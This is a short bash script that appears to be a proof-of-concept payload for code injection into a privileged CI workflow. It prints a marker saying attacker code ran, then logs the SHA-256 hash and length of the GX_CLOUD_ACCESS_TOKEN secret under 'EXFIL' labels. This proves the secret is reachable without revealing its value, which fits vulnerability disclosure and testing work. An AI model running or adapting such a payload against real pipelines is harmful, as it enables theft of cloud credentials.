#!/usr/bin/env bash
echo "ATTACKER_CODE_EXECUTED_IN_PRIVILEGED_WORKFLOW"
echo "EXFIL_SECRET_SHA256=$(printf '%s' "${GX_CLOUD_ACCESS_TOKEN:-<unset>}" | sha256sum | cut -d' ' -f1)"
echo "EXFIL_SECRET_LEN=${#GX_CLOUD_ACCESS_TOKEN}"
